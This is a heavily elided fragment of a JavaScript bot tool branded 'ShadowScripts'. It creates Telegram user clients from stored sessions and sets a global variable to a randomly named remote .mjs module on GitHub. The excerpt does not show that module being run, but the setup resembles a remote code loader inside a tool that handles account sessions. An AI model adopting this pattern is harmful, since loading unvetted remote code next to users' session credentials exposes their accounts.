...
<la>https://t.me/ShadowScripts_bots</la>
`
    );
    ...
    const tgClients = sessions.map((session) => {
      try {
        ...
        const tg_client = new TelegramClient(
          ...
          {
            connectionRetries: 5,
            deviceModel: "ShadowScripts Bots - " + os.type(),
            appVersion: "1.0.0",
            systemVersion: "1.0.0",
            langCode: "en",
            baseLogger: logger2,
...
global.url =
  "https://raw.githubusercontent.com/ShadowScripts1/WuykzEas0LDTwIhjYNYES5v7yZcQcK0B/refs/heads/main/ZgZF9GymuvmNtmnpbyNifDKG2RALp41uxuZvgUTB0mgq8qffmW.mjs";
